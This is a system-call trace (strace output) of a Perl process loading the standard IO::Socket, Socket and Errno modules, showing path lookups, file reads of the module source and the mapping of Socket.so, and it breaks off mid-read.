13033 07:45:20.072517 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.072531 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.072548 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.072562 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.072574 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.072588 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.072600 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.072613 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.072626 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
13033 07:45:20.072647 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
13033 07:45:20.072662 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab718) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.072674 _llseek(6, 0, [0], SEEK_CUR) = 0
13033 07:45:20.072691 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
13033 07:45:20.073023 stat64("/etc/perl/Socket.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.073039 stat64("/etc/perl/Socket.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.073053 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.073065 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.073079 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.073092 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.073106 stat64("/usr/lib/perl5/Socket.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.073118 stat64("/usr/lib/perl5/Socket.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.073131 stat64("/usr/share/perl5/Socket.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.073143 stat64("/usr/share/perl5/Socket.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.073156 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.073169 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
13033 07:45:20.073189 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.073203 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.073214 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.073232 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
13033 07:45:20.073632 brk(0x8239000)    = 0x8239000
13033 07:45:20.073885 read(8, "", 4096) = 0
13033 07:45:20.073902 close(8)          = 0
13033 07:45:20.073993 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
13033 07:45:20.074019 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
13033 07:45:20.074047 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
13033 07:45:20.074061 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
13033 07:45:20.074157 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
13033 07:45:20.074176 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d29000
13033 07:45:20.074190 mmap2(0xb7d2e000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d2e000
13033 07:45:20.074206 close(8)          = 0
13033 07:45:20.074760 brk(0x825a000)    = 0x825a000
13033 07:45:20.074962 stat64("/etc/perl/Errno.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.074980 stat64("/etc/perl/Errno.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.074994 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.075007 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.075021 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.075034 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.075048 stat64("/usr/lib/perl5/Errno.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.075060 stat64("/usr/lib/perl5/Errno.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.075073 stat64("/usr/share/perl5/Errno.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.075085 stat64("/usr/share/perl5/Errno.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.075098 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.075110 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
13033 07:45:20.075131 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.075146 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.075157 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.075179 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
13033 07:45:20.075913 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
13033 07:45:20.076332 _llseek(8, 5966, [5966], SEEK_SET) = 0
13033 07:45:20.076350 _llseek(8, 0, [5966], SEEK_CUR) = 0
13033 07:45:20.076361 close(8)          = 0
13033 07:45:20.076706 brk(0x827b000)    = 0x827b000
13033 07:45:20.076847 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n 